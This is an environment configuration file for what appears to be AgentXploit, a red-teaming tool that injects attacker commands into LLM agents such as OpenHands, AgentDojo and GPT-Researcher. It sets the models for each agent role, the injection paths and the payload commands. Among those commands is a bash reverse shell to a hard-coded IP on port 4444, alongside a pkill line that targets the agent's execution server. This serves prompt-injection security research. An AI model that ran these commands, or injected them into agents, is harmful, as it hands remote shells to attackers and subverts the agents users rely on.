# OpenAI API Configuration
OPENAI_API_KEY=enter_your_key_here
OPENAI_BASE_URL=enter_your_base_url_here
# Model Configuration per Agent
DEFAULT_MODEL=openai/gpt-4o
ROOT_AGENT_MODEL=openai/gpt-4o
ANALYSIS_AGENT_MODEL=openai/gpt-4o
LLM_HELPER_MODEL=openai/gpt-4o
EXPLOIT_AGENT_MODEL=openai/gpt-4.1-2025-04-14
# Directory Paths
TRAJECTORIES_DIR=path/to/AgentXploit/trajectories
ANALYSIS_DIR=path/to/AgentXploit/analysis
INJECTED_DIR=path/to/AgentXploit/injected

# File Names
SWEBENCH_FILE=SWEBenchlite.json

# Command Configurations
PKILL_COMMAND=pkill -f "action_execution_server"
REVERSE_SHELL_COMMAND=bash -i >& /dev/tcp/152.2.134.17/4444 0>&1
CUSTOM_TASK="Print 'hello, world!' to the console."
RUN_COMMAND=""
TIMEOUT=600
# Note: To use CUSTOM command type, set DEFAULT_COMMAND_TYPE=CUSTOM and define CUSTOM_TASK above

# Note: Injection Strategy Templates moved to library (src/AgentXploit/tools/exploit/injection_wrappers.py)
# Use injection_wrappers.get_technical_wrapper(command) instead of reading from env

# CLI Default Settings
MAX_WORKERS=3
MAX_FILES=100
MAX_STEPS=100
ANALYSIS_MODE=intelligent

# Default Command and Strategy Types
DEFAULT_COMMAND_TYPE=PKILL
# DEFAULT_INJECTION_STRATEGY=TECHNICAL  # Removed: Let model choose strategy automatically
#DEFAULT_DOCKER_COMMAND="docker run -d --rm --pull=always -e SANDBOX_RUNTIME_CONTAINER_IMAGE=docker.all-hands.dev/all-hands-ai/runtime:0.49-nikolaik -e LOG_ALL_EVENTS=true -v /run/user/$UID/docker.sock:/var/run/docker.sock -v path/to/OpenHands/shared:/shared --add-host host.docker.internal:169.229.219.180 --name openhands-app docker.all-hands.dev/all-hands-ai/openhands:0.49"
DEFAULT_DOCKER_COMMAND="docker run -d --rm -e MODEL=gpt-4.1-2025-04-14 -e OPENAI_API_KEY=xxx -e OPENAI_BASE_URL=xxx agentxploit-agentdojo tail -f /dev/null"

# General Agents Running Conigurations

#PHASE-2 config
PHASE_2_EXECUTION_COMMAND="bash get_report.sh -s workspace -ut user_task_15 -it injection_task_1"

REPORT_PATH="/work/report.txt"

#PHASE-4 config
PHASE_4_EXECUTION_COMMAND="bash run_agent.sh -s workspace -ut user_task_15 -it injection_task_1"
PHASE4_WORKSPACE="/work"
INJECTION_JUDGEMENT=""
RESULTS_DIR="path/to/AgentXploit/exploit_trace/agentdojo"


#GPT-Researcher
DEFAULT_GPTR_DOCKER_COMMAND="docker run -d --rm --name gpt-researcher --env-file .env  -v path/to/gpt-researcher:/my-docs  gptresearcher/gpt-researcher tail -f /dev/null"
PHASE_2_EXECUTION_COMMAND_GPTR="python test_run.py"
REPORT_PATH_DIR_GPTR="/usr/src/app/outputs/"
LOCAL_FILE_DIR_GPTR="/usr/src/app/my-docs/"
INJECTION_CONTENT_FILE_GPTR="path/to/AgentXploit/inject_content/injection_content.txt"
PHASE_4_EXECUTION_COMMAND_GPTR="python test_run.py"
